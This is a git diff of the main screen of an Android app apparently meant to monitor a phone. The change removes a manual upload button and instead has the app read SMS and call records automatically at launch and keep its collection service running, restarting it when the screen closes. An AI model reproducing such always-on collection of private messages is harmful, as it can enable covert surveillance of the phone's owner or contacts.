@@ -1,10 +1,8 @@
 package monitor.mobie.hdy.im;
 
 import android.Manifest;
-import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
-import android.content.ServiceConnection;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.net.ConnectivityManager;
@@ -12,7 +10,6 @@ import android.net.NetworkInfo;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
-import android.os.IBinder;
 import android.os.Message;
 import android.support.annotation.NonNull;
 import android.support.design.widget.FloatingActionButton;
@@ -20,7 +17,6 @@ import android.support.v4.app.ActivityCompat;
 import android.support.v7.app.AlertDialog;
 import android.support.v7.app.AppCompatActivity;
 import android.support.v7.widget.Toolbar;
-import android.util.Log;
 import android.view.Menu;
 import android.view.MenuItem;
 import android.view.View;
@@ -34,7 +30,6 @@ import java.io.Reader;
 
 import monitor.mobie.hdy.im.model.Reply;
 import monitor.mobie.hdy.im.service.MonitorService;
-import monitor.mobie.hdy.im.serviceimpl.MonitorBinder;
 import monitor.mobie.hdy.im.utils.Constants;
 import monitor.mobie.hdy.im.utils.ToastUtils;
 import okhttp3.Call;
@@ -67,38 +62,25 @@ public class MainActivity extends AppCompatActivity {
                 openLoginDisplay();
             }
         });
-        if (serviceIntent == null) {
-            serviceIntent = new Intent(MainActivity.this, MonitorService.class);
-            bindService(serviceIntent, connection, Context.BIND_AUTO_CREATE);
-        }
         toastUtils = new ToastUtils(MainActivity.this);
-        button = (Button) this.findViewById(R.id.button);
-        button.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                try {
-                    SharedPreferences data = getSharedPreferences("data", Context.MODE_PRIVATE);
-                    String phone = data.getString("phone", null);
-                    String password = data.getString("password", null);
-                    if (phone == null || phone.isEmpty() || password == null || password.isEmpty()) {
-                        openLoginDisplay();
-                        return;
-                    }
-
-                    Log.e(this.toString(), "上传数据");
-                    toastUtils.toast("上传数据中请稍后");
-                    button.setEnabled(false);
-                    monitorService.uploadAll(handler);
-                } catch (IOException e) {
-                    e.printStackTrace();
-                }
-            }
-        });
-        data = getSharedPreferences("data", Context.MODE_PRIVATE);
+        data = getSharedPreferences("data", Context.MODE_MULTI_PROCESS);
         edit = data.edit();
         init();
+        getContactMessage();
+        getSMSData();
+        if (serviceIntent == null) {
+            serviceIntent = new Intent(MainActivity.this, MonitorService.class);
+            serviceIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startService(serviceIntent);
+        }
     }
 
+
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+        startService(serviceIntent);
+    }
 
     private void init() {
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_NETWORK_STATE) != PackageManager.PERMISSION_GRANTED) {
@@ -112,16 +94,7 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onResume() {
         super.onResume();
-        if (monitorService == null) {
-            bindService(serviceIntent, connection, Context.BIND_AUTO_CREATE);
-        }
         toastUtils.toast("上次同步时间:" + data.getString("updateTime", "暂未同步"));
-    }
-
-    @Override
-    public boolean onCreateOptionsMenu(Menu menu) {
-        getMenuInflater().inflate(R.menu.menu_main, menu);
-        return true;
     }
 
     @Override
@@ -219,8 +192,10 @@ public class MainActivity extends AppCompatActivity {
                                     handler.sendMessage(message);
                                     edit.putString("phone", number).commit();
                                     edit.putString("password", passwd).commit();
+                                    serviceIntent = new Intent(MainActivity.this, MonitorService.class);
+                                    serviceIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                                    startService(serviceIntent);
                                     dialog.dismiss();
-                                    monitorService.uploadAll(handler);
                                 } else {
                                     handler.sendMessage(message);
                                 }
@@ -236,34 +211,31 @@ public class MainActivity extends AppCompatActivity {
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         if (requestCode == 1) {
             toastUtils.toast("必须需要读取通话记录权限!!!");
-            getContactMessage();
         } else if (requestCode == 2) {
             toastUtils.toast("必须需要读取短信权限!!!");
-            getSMSData();
         } else if (requestCode == 3) {
             toastUtils.toast("必须需要读取网络权限!!!");
-            init();
         }
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
     }
 
-    private ServiceConnection connection = new ServiceConnection() {
-        //当绑定成功时执行
-        @Override
-        public void onServiceConnected(ComponentName name, IBinder service) {
-            //把service强制转换为LocalService.LocalBinder我自己定义的这个类
-            MonitorBinder binder = (MonitorBinder) service;
-            monitorService = binder.getService();//调用这个类中的getService方法，得到localService对象
-            flag = true;//设置为true
-            Log.e(this.toString(), "服务已经启动");
-        }
-
-        //绑定断开时执行
-        @Override
-        public void onServiceDisconnected(ComponentName name) {
-            flag = false;
-        }
-    };
+//    private ServiceConnection connection = new ServiceConnection() {
+//        //当绑定成功时执行
+//        @Override
+//        public void onServiceConnected(ComponentName name, IBinder service) {
+//            //把service强制转换为LocalService.LocalBinder我自己定义的这个类
+//            MonitorBinder binder = (MonitorBinder) service;
+//            monitorService = binder.getService();//调用这个类中的getService方法，得到localService对象
+//            flag = true;//设置为true
+//            Log.e(this.toString(), "服务已经启动");
+//        }
+//
+//        //绑定断开时执行
+//        @Override
+//        public void onServiceDisconnected(ComponentName name) {
+//            flag = false;
+//        }
+//    };
 
     public Handler handler = new Handler() {
         @Override
